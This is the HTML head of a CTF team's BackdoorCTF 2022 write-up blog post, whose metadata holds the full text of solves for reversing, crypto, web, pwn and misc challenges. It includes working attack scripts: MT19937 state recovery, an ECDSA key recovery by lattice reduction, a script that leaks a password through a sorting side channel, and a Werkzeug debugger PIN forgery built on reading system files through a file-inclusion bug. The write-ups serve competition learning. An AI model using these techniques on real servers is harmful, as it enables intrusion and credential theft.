<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>BackdoorCTF 2022 Writeup | Black Bauhinia</title>

<meta name="keywords" content="ctf" />
<meta name="description" content="We played BackdoorCTF and we won the second place.">
<meta name="author" content="botton, fsharp, harrier, LifeIsHard, J4cky, Ja5on, Mystiz, Viky">
<link rel="canonical" href="https://b6a.black/posts/2022-12-24-backdoorctf/" />
<link href="/assets/css/stylesheet.min.79c4dfee3993cd3110886e38d36a5106e0d6922344cefa3ff5c0076f246815f0.css" integrity="sha256-ecTf7jmTzTEQiG4402pRBuDWkiNEzvo/9cAHbyRoFfA=" rel="preload stylesheet"
    as="style">

<link rel="icon" href="https://b6a.black/favicon.ico">

<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<meta name="generator" content="Hugo 0.91.0" />




<script async src="https://www.googletagmanager.com/gtag/js?id=G-M67YZZ2MP1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-M67YZZ2MP1');
</script>



<script src="https://kit.fontawesome.com/fbbadced05.js" crossorigin="anonymous"></script>


<link rel="preconnect" href="https://fonts.gstatic.com">
<link href="https://fonts.googleapis.com/css2?family=Recursive&display=swap" rel="stylesheet"> 


<meta property="og:title" content="BackdoorCTF 2022 Writeup" />
<meta property="og:description" content="We played BackdoorCTF and we won the second place." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://b6a.black/posts/2022-12-24-backdoorctf/" />
<meta property="og:image" content="https://b6a.black/images/2022-12-24-backdoorctf/scoreboard.png" /><meta property="article:published_time" content="2022-12-24T19:00:00+08:00" />
<meta property="article:modified_time" content="2022-12-24T19:00:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://b6a.black/images/2022-12-24-backdoorctf/scoreboard.png" />
<meta name="twitter:title" content="BackdoorCTF 2022 Writeup"/>
<meta name="twitter:description" content="We played BackdoorCTF and we won the second place."/>

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "BackdoorCTF 2022 Writeup",
  "name": "BackdoorCTF 2022 Writeup",
  "description": "We played BackdoorCTF and we won the second place.",
  "keywords": [
    "ctf"
  ],
  "articleBody": "We played BackdoorCTF and we won the second place.\nReversing 5p4gh3tt1 (12 solves) Solved by harrier and fsharp\nWe need to provide a recipe to the new spaghetti machine Sanji just bought. The recipe must satisfy several conditions which need to be reverse-engineered.\nThe binary given is a Rust program that checks whether a user-provided recipe is valid. After analyzing it in Ghidra, a namespace called chall could be found. Inside it, you could find several functions, one of which is the main function. Its logic is basically:\nprint(\"Enter your great spaghetti recipe:\") recipe = new_recipe() if boiling_spaghetti(recipe) and chopping_veggies(recipe) and garnishing(recipe): print(\"It is indeed a great recipe!\") else: print(\"You call this your great recipe? Disappointing.\") new_recipe() This is where the program receives user input. It also performs a length check which, if failed, would make the program exit early.\nimport sys def new_recipe(): recipe = input() if len(recipe) != 40: print(\"Are you sure this is a spaghetti recipe?\") sys.exit() return recipe So, our recipe needs to be exactly 40 characters long.\nPart 1: boiling_spaghetti() From here onwards, 3 functions would be called, each of which would be called only if the function before it succeeded. Each function checks whether a specific part of the recipe is correct.\nboiling_spaghetti() turns each of the first 10 characters of the recipe into a value, which depends on the character position and value modulo 2. Afterwards, these values are checked against 10 hardcoded values.\ndef add_oil(ingredient): return ((((ingredient + 3) ^ 0x4f) + 0x31) ^ 0x44) + 9 def add_pepper(ingredient): return ((ingredient ^ 0x38) + 6) ^ 5 def add_salt(ingredient): return ingredient * 4 + 6 def add_water(ingredient): return (ingredient + 0x58) ^ 0x4d def boiling_spaghetti(recipe): vals = [] encoded = [0xb7, 0x29, 0x1af, 0x72, 0x207, 0xfa, 0x167, 0xd1, 0xc1, 0x13] for i in range(10): ingredient = recipe[i] if i % 2 == 0: if ingredient % 2 == 0: val = add_oil(add_water(ingredient)) # 1st branch else: val = add_water(add_salt(ingredient)) # 2nd branch else: if ingredient % 2 == 0: val = add_pepper(add_oil(ingredient)) # 3rd branch else: val = add_salt(add_oil(ingredient)) # 4th branch vals.append(val) return vals == encoded We decided to bruteforce the possible characters for all branches for each value:\ndef add_oil_rev(ingredient): return ((((ingredient - 9) ^ 0x44) - 0x31) ^ 0x4f) - 3 def add_pepper_rev(ingredient): return ((ingredient ^ 5) - 6) ^ 0x38 def add_salt_rev(ingredient): return (ingredient - 6) // 4 def add_water_rev(ingredient): return (ingredient ^ 0x4d) - 0x58 encoded = [0xb7, 0x29, 0x1af, 0x72, 0x207, 0xfa, 0x167, 0xd1, 0xc1, 0x13] for ingredient in encoded: a = add_water_rev(add_oil_rev(ingredient)) b = add_salt_rev(add_water_rev(ingredient)) c = add_oil_rev(add_pepper_rev(ingredient)) d = add_oil_rev(add_salt_rev(ingredient)) if not 32  a  126: a = 0 if not 32  b  126: b = 0 if not 32  c  126: c = 0 if not 32  d  126: d = 0 print(f\"'{chr(a)}', '{chr(b)}', '{chr(c)}', '{chr(d)}'\") The output is\n'f', ''', ' ', 'v' ' ', ' ', 'l', ' ' ' ', 'a', ' ', ' ' ' ', ' ', ' ', 'g' ' ', '{', ' ', 'J' '-', ' ', ' ', 'm' ' ', '3', ' ', ' ' ' ', ' ', '4', 'p' 't', ' ', 'D', '|' ' ', ' ', 'b', ' ' For the 0th, 2nd, 4th, 6th and 8th rows, we consider the possible characters in the first two branches. For the other rows, we consider those in the remaining two branches.\nHere, we guessed that the first part of the recipe is flag{m34tb since it’s related to food. m34tb is ‘meatb’ in leetspeak, which is likely to be the beginning of ‘meatballs’, and meatballs could be found in some spaghetti recipes.\nPart 2: chopping_veggies() This is the most complicated part in our opinion. Some operations are done to determine the values of 3 variables, which depend on the first 10 characters of the recipe. These 3 variables would later be used to turn the 11th to 30th characters of the recipe into values that would be checked against 20 hardcoded values.\ndef chop_veggies(veggie, quant): remainder = veggie % 3 if remainder == 0: return (veggie * quant) ^ quant elif remainder == 1: return (veggie ^ quant) * quant return (veggie * quant) ^ veggie def chopping_veggies(recipe): vals = [] encoded = [0x28e00, 0x9925, 0x5a9e, 0x4fb5, 0x85a8, 0xbcec, 0xa56e, 0x17b55, 0x4f35, 0x4fb5, 0x18c41, 0xbcec, 0x2da80, 0x92c0, 0x2a74, 0xae74, 0xa3e0, 0xc11a, 0x8edf, 0x1ec25] #  quant1 = ??? quant2 = ??? quant3 = ??? for i in range(10, 30): veggie = recipe[i] remainder = (i - 10) % 3 if remainder == 0: val = chop_veggies(veggie, quant1) elif remainder == 1: val = chop_veggies(veggie, quant2) else: val = chop_veggies(veggie, quant3) vals.append(val) return vals == encoded Dynamic analysis comes to the rescue. By entering flag{m34tb and 30 bytes of gibberish as the recipe, it is found that quant1 = 384, quant2 = 361, and quant3 = 214. Now it’s possible to reverse the operations done on each hardcoded value:\nquant1 = 384 quant2 = 361 quant3 = 214 part2 = \"\" encoded = [0x28e00, 0x9925, 0x5a9e, 0x4fb5, 0x85a8, 0xbcec, 0xa56e, 0x17b55, 0x4f35, 0x4fb5, 0x18c41, 0xbcec, 0x2da80, 0x92c0, 0x2a74, 0xae74, 0xa3e0, 0xc11a, 0x8edf, 0x1ec25] for i in range(len(encoded)): val = encoded[i] remainder = i % 3 if remainder == 0: quant = quant1 elif remainder == 1: quant = quant2 else: quant = quant3 for c in range(32, 127): if chop_veggies(c, quant) == val: part2 += chr(c) break print(part2) The second part of the recipe is 4ll5_4nd_5p4gh3tt1_4. So we were right about the meatballs after all!\nPart 3: garnishing() garnishing() checks the last 10 characters of the recipe. If any of the characters match 10 specific characters, they are mapped into one of 10 other characters. The string is then reversed and checked against a hardcoded string.\ndef garnishing(recipe): vals = recipe[30:] encoded = \"%@!\u0026*/+#.)\" trans = {'0': '/', '2': '*', '3': '\u0026', '5': ')', 'A': '.', 'L': '+', 'H': '@', 'B': '#', '}': '%', '4': '!'} table = vals.maketrans(trans) vals = vals.translate(table)[::-1] return vals == encoded Reverse the mappings as follows:\npart3 = \"\" encoded = \"%@!\u0026*/+#.)\"[::-1] reverse_trans = {'/': '0', '*': '2', '\u0026': '3', ')': '5', '.': 'A', '+': 'L', '@': 'H', '#': 'B', '%': '}', '!': '4'} for c in encoded: part3 += reverse_trans[c] print(part3) The third part of the recipe is 5ABL0234H}.\nCombining the three parts together, the recipe (i.e. the flag) is flag{m34tb4ll5_4nd_5p4gh3tt1_45ABL0234H}.\nCrypto Fishy (15 solves) Solved by Mystiz and LifeIsHard\nThe original source code has a lot of redundant or over-complicated parts. The charts below show briefly what the code did:\nFrom the source code, we can see that random.getrandbits is used for 256×4=1024 times to generate s_boxes.\nPython uses MT19937 as its pseudorandom number generator. This generator is predictable as we can recover the state from 624 32-bits output. Therefore, we can first get the key by recovering the state, then reverse the enecryption steps.\nStep 1: Recover key We can use the code in this repo to recovering internal state from outputs. https://github.com/twisteroidambassador/mt19937-reversible\nfrom mersenne_twister import * from itertools import chain import random def recover_key(output): stdlib_random = random.Random() mt = MT19937() output_for_cloning = list(chain.from_iterable(s_boxes)) # clone state with the first 624 32-bit random numbers mt.clone_state_from_output(output_for_cloning[0:624]) # check [624:] of s_boxes, confirm the state is recovered generate_new = [mt.get_next_random() for _ in range(len(output_for_cloning) - mt.n)] assert generate_new == output_for_cloning[624:] # get the next 18 32-bit random numbers (which is the key) key = ''.join([hex(mt.get_next_random())[2:].zfill(8) for i in range(18)]) return key s_boxes = eval(open('s_boxes.txt','r').read().strip()) key = bytes.fromhex(recover_key(s_boxes)) The key is f25933f9b09571c39223c3040d5a43c1695417f8d94659b6f4fd7f8063fc3575d5ad46258df8d08c2916b3c5ed24d92b33bc1d2010959499312f94cc04139ea2727d0b08b03a71b1.\nWe will convert the key to bytes for the next step.\nStep 2: Decrypt After we recovered the key, we can get processed_sub_keys. Then we can decrypt the ciphertext by reversing the steps in source code.\nfrom Crypto.Util.number import bytes_to_long, long_to_bytes modulus = pow(2, 32) ct = bytes.fromhex('f2b4b9be3b93cb2d8cc762bdf1d6cd57419d5c83d86c31faf9d2a39a829da4f7a831790ec17c1e7d0c7ae6615b6f5343478ccd9424a77e8aa66ef09233b0caee') initial_sub_keys = ['243f6a88','85a308d3','13198a2e','03707344','a4093822','299f31d0','082efa98','ec4e6c89','452821e6','38d01377','be5466cf','34e90c6c','c0ac29b7','c97c50dd','3f84d5b5','b5470917','9216d5d9','8979fb1b',] key = [bytes_to_long(key[4*i:4*i+4]) for i in range(18)] processed_sub_keys = [k^int(sub,16) for k,sub in zip(key, initial_sub_keys)] def decrypt(processed_sub_keys, s_boxes, ct): m = b'' for i in range(0, len(ct), 8): xl, xr = bytes_to_long(ct[i:i+4]), bytes_to_long(ct[i+4:i+8]) xl, xr = xr ^ processed_sub_keys[16], xl ^ processed_sub_keys[17] for j in range(15,-1,-1): new_xl, new_xr = xl, xr xa, xb, xc, xd = long_to_bytes(xl ^ processed_sub_keys[j]) xn = (s_boxes[0][xa] + s_boxes[1][xb]) % modulus xn = s_boxes[2][xc] ^ xn f_out = (xn + s_boxes[3][xd]) % modulus xl, xr = new_xr, new_xl ^ f_out m += long_to_bytes(xl) + long_to_bytes(xr) return m flag = decrypt(processed_sub_keys,s_boxes,ct) print(flag) The flag is flag{d0n't_u53_th3_m3r53nn3_r4nd0m_g3n3r4t0r_w1th0ut_c4ut10n_.\nRandom Nonsense (4 solves) Solved by Mystiz\nChallenge Summary We are given a server that signs up to 49 messages (except the message $m_0$) with a secret key, $d$, with ECDSA over the curve P384. The goal is to forge a signature for the message $m_0$.\nThe sign function specifies on how the signature is created from the message msg.\ndef encode(m: bytes) - int: m = m.decode() enc_arr = range(1, counter + 1) if len(list(set(m))) == counter: s = set() enc_arr = [] for x in m: if x in s: continue enc_arr.append(MAP[x]) s.add(x) return sum([(-2)**i*x for i, x in enumerate(enc_arr)])%n def sign(msg, d): x = int(hashlib.sha256(long_to_bytes(encode(msg) \u0026 random.randrange(1, n - 1))).hexdigest(), 16) % 2**50 while True: k = (random.getrandbits(320)  50) + x r = (k*G).x() if r != 0: break m = int(hashlib.sha256(msg).hexdigest(), 16) s = (inv(k)*(m + r*d)) % n return (int(r), int(s)) Solution I spent some time understanding the encode function, but then I noticed the range of k: The size of k is 370 bits long… It is smaller than 384! Since k is relatively small, we can use LLL to recover the secret key d:\n#!/usr/bin/env python3 # -*- coding: UTF-8 -*- import os from pwn import * import hashlib import ecdsa from ctfools import Challenge as BaseChallenge def sign(msg, d): Curve = ecdsa.NIST384p G = Curve.generator n = int(Curve.order) k = 1337 r = int((k*G).x()) m = int(hashlib.sha256(msg).hexdigest(), 16) s = (pow(k, -1, n)*(m + r*d)) % n return (int(r), int(s)) class Challenge(BaseChallenge): def __init__(self, *args, **kwargs): super().__init__(*args, **kwargs) # self.r.recvline() # Example if you gonna skip one line def _sign_send(self, m): self.r.sendline(b'S') self.r.sendline(m) def _sign_recv(self): self.r.recvuntil(b'r=') r = int(self.r.recvuntil(b' ').decode()[:-2]) self.r.recvuntil(b's=') s = int(self.r.recvline().decode()) return r, s def main(): _local = 'local' in os.environ _log = 'log' in os.environ r = Challenge( conn='nc hack.backdoor.infoseciitr.in 17701', proc=['python3', 'challenge/chall.py'], local=_local, log=_log) Curve = ecdsa.NIST384p q = Curve.order m = 49 A = Matrix(ZZ, 2*m+2) weights = [q for _ in range(m)] + [q, 1] + [2^14 for _ in range(m)] log.info('Signing...') msgs = [os.urandom(16).hex().encode() for i in range(m)] for msg in msgs: r._sign_send(msg) for i, msg in enumerate(msgs): h = int.from_bytes(hashlib.sha256(msg).digest(), 'big') _r, _s = r._sign_recv() A[0, i ] = h A[1, i ] = _r A[2+i, i ] = -_s A[2+m+i, i ] = q for i in range(m+2): A[i, m+i] = 1 log.info('Computing LLL...') Q = diagonal_matrix(weights) A *= Q A = A.LLL() A /= Q for row in A: if row[m]  0: row = -row if row[m] != 1: continue if min(row[:m])  0: continue if max(row[:m])  0: continue d = int(row[m+1]) break else: assert False, 'no good!' _r, _s = sign(b'Sign me to get the flag', d) log.success(f'{_r = }') log.success(f'{_s = }') r.r.sendline(b'V') r.r.sendline(b'Sign me to get the flag') r.r.sendline(str(_r).encode()) r.r.sendline(str(_s).encode()) r.interactive() if __name__ == '__main__': main() # flag{y0u_g07_7h3_h1dd3n_p3rmu7a710n_pR0bL3m} Morph (2 solves) Solved by Mystiz\nChallenge Description Let $M$ be a square matrix. Define $M^{[n]}$ by\n$$M^{[n]} = {H_1}^{n-1} \\cdot M \\cdot {H_2}^{n-1} + {H_1}^{n-2} \\cdot M \\cdot {H_2}^{n-2} + … + M.$$\nWe are given a prime $p$ and $4 \\times 4$ matrices $H_1$, $H_2$, $M$, $A$ and $B$ such that\n $H_1$ and $H_2$ are singular, $A = M^{[\\alpha]}\\ \\text{mod} \\ p$ and $B = M^{[\\beta]}\\ \\text{mod}\\ p$ for some unknowns $\\alpha$ and $\\beta$.  The goal is to find $S := M^{[\\alpha + \\beta]}\\ \\text{mod}\\ p$.\nSolution We tried multiple approaches but in vain. For instance we\n expressed everything mathematically and see if there is something fishy, tried to see if the discrete log can be easily computed, or even predicted the number generated by Python’s random…  Eventually, we came across to the paper Cryptanalysis of Semidirect Product Key Exchange Using Matrices Over Non-Commutative Rings. The challenge is implementing the key exchange mentioned in the paper, which is shown to be fragile. Therefore we followed the steps given by section 3 and got the flag: flag{y0u_c4n_M$K#_7h3_74bl3s_7Urn}.\nWeb S3KSU4L_INJ3C710N (10 solves) Solved by Viky\nChallenge description The challenge provides an web application with its source code. Once accessing the site URL, you can see the site returning a list of users.\nSource code Let us take look on what this application does from the provided source code. The following is the API which was used to retrieve users from database.\n@app.route('/api/data') def data(): query = User.query total_filtered = query.count() col_index = request.args.get('order[0][column]') flag=1 if col_index is None: col_index=0 flag=0 col_name = request.args.get(f'columns[{col_index}][data]') users=[user.to_dict() for user in query] descending = request.args.get(f'order[0][dir]') == 'desc' try: if descending: users=sorted(users,key=lambda x:helper(x,col_name),reverse=True) else : users=sorted(users,key=lambda x:helper(x,col_name),reverse=False) except: pass start = request.args.get('start', type=int) length = request.args.get('length', type=int) users=users[start:start+length] for user in users: del user['password'] if flag==0: random.shuffle(users) return { 'data': users, 'recordsFiltered': total_filtered, 'recordsTotal': 500, 'draw': request.args.get('draw', type=int), } As you can see there are only a few meaningful parameters\n order[0][column]  Assignes the user provided value to the variable col_index   columns[{col_index}][data]  Based on the user provided value, col_name would be used to sort the users via helper function   order[0][dir]  Determines if the returned users are sorted in ascending or descending order   start  Detemines the starting index of the returned users list   length  Determines the length of the returned users list   draw  Determines the value of draw. Not that useful.    This implies we can control how many users being returned from the API and how it could be sorted.\nWe should also check how users are defined. The following code are ran on server start.\nfaker=Faker() hexc=[] for i in range(16): hexc.append(hex(i)[2:]) for i in range(50): random.shuffle(hexc) passwords=[] lucky=random.randint(100,400) f=open('users.txt','w') for i in range(500): random.shuffle(hexc) passwords.append(\"\".join(hexc)) name=faker.name() phone=faker.phone_number() if phone[0]!='+': phone='+'+phone if i == lucky: name='Adm1n_h3r3_UwU' f.write(name+'||'+passwords[i]+'||'+faker.address().replace('\\n',', ')+'||'+phone+'||'+faker.email()) f.write('\\n') f.close() Basically this code provides the following information\n The hexc variable is a list of 16 characters ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'] There are 500 users with one random user will be assigned a special name Adm1n_h3r3_UwU. A password will be created for each user by shuffling the hexc variable with function random.shuffle, so we can tell the password will be of length 16, with 16! of possible permutation  Challenge Analysis So after all that work, what is the flag for this challenge? What? You don’t have any idea? Well, it was quite obvious to see that the password of that special user is the flag of this challenge.\nThe password is removed before returning user data from /api/data. Is there a way to obtain the password of the user Adm1n_h3r3_UwU?\nBasically what we could do is that we can query the users and sort them with any column, including password. However, a password may have 16! permutation, thus it is not that helpful if we sort users with the entire password. We can do better. Let us have a look how help was defined.\ndef helper(data, prop, is_data=False): pr = prop.split('.') pr1= prop.split('.') count=0 for p in pr: if count == 2: return None count+=1 pr1=pr1[1:] nextprop = '.'.join(pr1) if hasattr(data, p): if nextprop=='': return getattr(data, p) return helper(getattr(data, p), nextprop, True) ...snip... elif type(data) == list or type(data) == tuple or type(data)==str: try: if nextprop=='': return data[int(p)] return helper(data[int(p)], nextprop, True) except (ValueError, TypeError, IndexError): return None else: return None if is_data: return data else: return None What does this do? Let us ask ChatGPT.\nThis is a recursive function that takes in a data object, a property string, and an optional boolean flag and returns the value at the specified property of the data object if it exists, or None if it does not exist. The property string can include dots to indicate nested properties and the function will traverse the data object accordingly. The optional boolean flag is used to indicate whether the data object being passed to the function is the original data object or a nested data object. This means we can sort users by user.password.__repr__ by setting the GET parameter columns[{col_index}][data] to password.__repr__. Is this useful? Not really. However, what happens if you provide an integer? What if we pass password.0?\nelif type(data) == list or type(data) == tuple or type(data)==str: try: if nextprop=='': return data[int(p)] return helper(data[int(p)], nextprop, True) user.password is a string and 0 is the last property, nextprop will be '', then data[int(p)] would be returned. This meansuser.password.0 will be interperted asuser.password[0]. This implies we can sort users by each character of the password. With this information we can sort the users by each index of the password and guess each character.\nExploitation First attempt, assuming that the password character set is evenly distributed, divide the users into 16 chunks and guess the admin password by checking which chunk the admin is at. Gets a479ce51ec083f27. This was obviously wrong as there are duplicated characters.\nSecond attempt, I tried to sort the index of admin in user lists of each password index in ascending order and assign the smallest admin index to the first character in the sortedhexc at the corresponding password index and so on. This yeilds a479be51dc083f26 which is also wrong, but is actually quite close to the correct password.\nThird attempt, thanks to mystiz613 for observing the in-place property of the function sorted(), we can know the exact character of each index of the password by observing index of users in ascending and descending orders. In particular, the users are sorted in-place which would occupy the same storage as the original ones when there is a tie as the following code implied.\ntry: if descending: users=sorted(users,key=lambda x:helper(x,col_name),reverse=True) else : users=sorted(users,key=lambda x:helper(x,col_name),reverse=False) Let us take a moment to appreciate the following screenshot from mystiz which illustrate the in-place property of users sorted ascendingly and descendingly.\nSo basically we can determine the different chunks of users by comparing the list of sorted users from ascending order and descending order.\nConsider the following list sorted by the first character of password ascendingly.\n[ {\"user\":2,\"password\":\"0213\"}, {\"user\":7,\"password\":\"0132\"}, {\"user\":1,\"password\":\"1230\"}, {\"user\":4,\"password\":\"1203\"}, {\"user\":6,\"password\":\"2103\"}, {\"user\":5,\"password\":\"2130\"}, {\"user\":3,\"password\":\"3120\"}, {\"user\":8,\"password\":\"3102\"}, ] If we sorted the first character of password descendingly, we would get the following.\n[ {\"user\":3,\"password\":\"3120\"}, {\"user\":8,\"password\":\"3102\"}, {\"user\":6,\"password\":\"2103\"}, {\"user\":5,\"password\":\"2130\"}, {\"user\":1,\"password\":\"1230\"}, {\"user\":4,\"password\":\"1203\"}, {\"user\":2,\"password\":\"0213\"}, {\"user\":7,\"password\":\"0132\"}, ] In our simplfied scenario, password is 4 character long with range from 0 to 3. In a large enough sample size (16 characters randomly distributed among 500 users), we can say it is very likely that every single character will appear at each index of the password. There are some facts that we can tell from the two list:\n user 2 password starts with 0 as it is the first element of the ascending list user 7 password starts with 0 as it is the last element of the decending list Any users between user 2 and user 7 have password starts as 0 as the list is sorted We can deduce user 1 password starts with 1 as it is right after user 7 in the ascending list. We can deduce user 4 password starts with 1 as it is right before user 2 in the decending list. And so on until reaching the end of the list  We can tell what is the corresponding password character for users from their corresponding index in the user list. After we have the mapping, we just have to find the index of user Adm1n_h3r3_UwU and determine the character of password at a particular index. Repeat the query from password.0 to password.15 to obtain the entire password of user Adm1n_h3r3_UwU\nSolve script import requests url = \"http://hack.backdoor.infoseciitr.in:16052/api/data\" query_params = { \"columns[0][data]\": \"password.2\", \"columns[0][passwords]\": \"\", \"order[0][column]\": \"0\", \"order[0][dir]\": \"AAA\", \"start\": \"0\", \"length\": \"500\" } password_charset = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'] def get_index_from_list(lst, name): for i, v in enumerate(lst): if(v[\"name\"] == name): return i return None idxs = [] temp_map = {} password = \"\" for i in range(16): query_params[\"columns[0][data]\"] = f\"password.{i}\" query_params[\"order[0][dir]\"] = \"asce\" response = requests.get(url, params=query_params, verify=False) if response.status_code == 200: data = response.json()[\"data\"] admin_index = next((index for (index, d) in enumerate(data) if d[\"name\"] == \"Adm1n_h3r3_UwU\"), None) else: print(\"Request failed with status code:\", response.status_code) query_params[\"order[0][dir]\"] = \"desc\" response = requests.get(url, params=query_params, verify=False) if response.status_code == 200: data_rev = response.json()[\"data\"] else: print(\"Request failed with status code:\", response.status_code) a = [0] b = [len(data_rev)] j = 0 while True: temp_rev_idx = get_index_from_list(data_rev,data[a[j]][\"name\"]) temp_len = len(data_rev[temp_rev_idx:b[j]]) temp_idx = a[j] + temp_len a.append(temp_idx) b.append(temp_rev_idx) j += 1 if temp_idx = 500: break for k,c in zip(range(0,len(a)-1),password_charset): x = range(a[k],a[k+1]) if(admin_index in x): password += c print(f\"password at idx {i}: {c}\") break print(password) The output of the script yields a469ce51db083f27\nKonsolation prize (11 solves) Solved by J4cky, Ja5on\nThree endpoints were found after some directory enumeration.\n /admin shows the error debug log, exposing information about this challenge: the backend is Python Flask + Jinja2 + Werkzeug \u0026 the endpoint /article takes a GET parameter name /console is the Werkzeug debugger console, pin is required /article shows an error message [Errno 2] No such file or directory: 'article'  From the source code shown in the error debug log , we can correlate with this error message that the server is trying to open the file which is the value of the GET parameter name. Hence there is a LFI and we can make use of this to calculate the pin for the console. By LFI the Werkzeug’s debug __init__.py, variables needed are:\n username who started this Flask, can be found from /proc/self/environ modname which is flask.app getattr(app, '__name__', getattr (app .__ class__, '__name__')) which is Flask getattr(mod, '__file__', None) the absolute path of app.py in the flask directory, can be found from the error debug log uuid.getnode() MAC address of the server, first get the device ID from /proc/net/arp (which is eth0), then get the MAC address from /sys/class/net//address (i.e., /sys/class/net/eth0/address) get_machine_id() this is the most tricky one as it various according to the version of Werkzeng. For this time, it requires the value of either /etc/machine-id or /proc/sys/kernel/random/boot_id appending with the value after the 3rd slash of the first line in /proc/self/cgroup. Since /etc/machine-id doesn’t exist, we will append the value of /proc/sys/kernel/random/boot_id with the value in /proc/self/cgroup as shown below. (P.S. this value would be changed after the server is restarted)  It should be noted that the hashing algorithm is SHA1 instead of MD5 (old version).\nA sample script for generating the pin:\nimport hashlib from itertools import chain rv = None num = None probably_public_bits = [ 'r00t-user' , # username /proc/self/environ 'flask.app' , # modname 'Flask', # getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.9/site-packages/flask/app.py' # getattr(mod, '__file__', None) ] private_bits = [ '2485377892355' , # /sys/class/net/eth0/address 02:42:ac:11:00:03 'd5a09294-c0e7-4cf9-a10b-4cdb79f8620cf6583bfe596e2de1979391a591ec7c07363bc587eb59051cf7237b4a5762f39b' # /proc/sys/kernel/random/boot_id + /proc/self/cgroup ] h = hashlib.sha1() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv) Finally with the correct pin and the good timing that the console was not locked due to too many failed attempt, we were able to use the interactive console to TRY TO get the hidden flag… Spent some time checking from different directories with no luck…then @harrier suggested we may try to search for the files with most recent updated time, so we can use find / -mtime 0 and got the result:\n...... /usr/share/doc/procps /usr/share/doc/libprocps8 /usr/share/doc/psmisc /usr/srv /usr/srv/secrets /usr/srv/secrets/y0u_f0und_m3_l0l.txt /challenge /challenge/public /.dockerenv /src /src/app /src/app/__pycache__ /src/app/__pycache__/server.cpython-310.pyc /src/app/templates /src/app/templates/main.html /src/app/templates/article.html /src/app/templates/base.html /src/app/server.py Finally we got the flag from /usr/srv/secrets/y0u_f0und_m3_l0l.txt. What a good forensick challenge!\nPwn babystl (13 solves) Solved by botton\nInput some garbage randomly then get the flag. Solved within one minute :)\nLook back in ida, we would find a function checker that give us the shell\nint allocator_schar *::checker() { int result; // eax  result = _alloc_s; if ( (unsigned int)_alloc_s  0x10000 ) return system(\"/bin/sh\"); return result; } The _alloc_s is next to the stack_storage, if we call push message with stack, the program will push a heap address in it.\n.bss:000000000000B2F0 stack_storage dq 2 dup(?) ; DATA XREF: allocator_schar *::push_back(char * const\u0026)+87↑o .bss:000000000000B2F0 ; allocator_schar *::emplace_back(char * const\u0026)+9E↑o ... .bss:000000000000B300 public __alloc_s .bss:000000000000B300 __alloc_s dd ? ; DATA XREF: allocator_schar *::checker(void)+10↑r Therefore, we can call three times push message and it will push a address in _alloc_s. Finally, we can call read message to trigger the checker function.\nMisc Welcome (87 solves) Solved by fsharp\nSometime after the CTF began, a few channels in the BackdoorCTF Discord server had newly pinned messages. One of those pinned messages is from the #random channel and contains the flag:\nLet’s Blend in (23 solves) Solved by fsharp\nA picture of a blender is provided. Running binwalk against the image shows that it contains an embedded zip file. After extracting its contents with binwalk -e --dd=.* blender.png, we see that it contains 5 grayscale images, each titled b, d, e, l and n.\nChecking the values of pixels for each of the 5 images reveals that they could be interpreted as ASCII characters. The following Python script is written to extract these pixel values and turn them into text:\nfrom PIL import Image image_names = ['b', 'l', 'e', 'n', 'd'] for image_name in image_names: image = Image.open(image_name, 'r') pixel_values = [] for y in range(image.height): for x in range(image.width): coords = (x, y) pixel_value = image.getpixel(coords) pixel_values.append(pixel_value) print(image_name) print(bytes(pixel_values).decode()) print() image.close() We get the following output:\nb bpy.ops.object.text_add() ob=bpy.context.object ob.data.body = \"-... --- .-. -\" l bpy.ops.object.text_add(location=(5,0,0)) ob=bpy.context.object ob.data.body = \". - --- ... - .- -\" e bpy.ops.object.text_add(location=(10,0,0)) ob=bpy.context.object ob.data.body = \". -.. --- ..- - .\" n bpy.ops.object.text_add(location=(15,0,0)) ob=bpy.context.object ob.data.body = \".. --- .-- --\" d bpy.ops.object.text_add(location=(20,0,0)) ob=bpy.context.object ob.data.body = \"- -. .----. - -... .-.. . -. -..\" The text from each image is part of a script that creates objects with text using the Blender Python API. Each object contains Morse code and are placed in specific positions.\nDirectly translating each piece of Morse code into letters shows something resembling English but with spelling errors. But what if we concatenate each piece of Morse code together without spaces and translate that instead?\nUsing the Morse code translator from morsecode.world, we translate -... --- .-. -. - --- ... - .- -. -.. --- ..- - ... --- .-- --- -. .----. - -... .-.. . -. -..\nto get BORNTOSTANDOUTSOWON'TBLEND\nSo, the flag is flag{BORNTOSTANDOUTSOWON'TBLEND}. And yes, it’s case-sensitive, because why not.\n",
  "wordCount" : "4495",
  "inLanguage": "en",
  "image":"https://b6a.black/images/2022-12-24-backdoorctf/scoreboard.png","datePublished": "2022-12-24T19:00:00+08:00",
  "dateModified": "2022-12-24T19:00:00+08:00",
  "author":[{
    "@type": "Person",
    "name": "botton"
  }, {
    "@type": "Person",
    "name": "fsharp"
  }, {
    "@type": "Person",
    "name": "harrier"
  }, {
    "@type": "Person",
    "name": "LifeIsHard"
  }, {
    "@type": "Person",
    "name": "J4cky"
  }, {
    "@type": "Person",
    "name": "Ja5on"
  }, {
    "@type": "Person",
    "name": "Mystiz"
  }, {
    "@type": "Person",
    "name": "Viky"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://b6a.black/posts/2022-12-24-backdoorctf/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Black Bauhinia",
    "logo": {
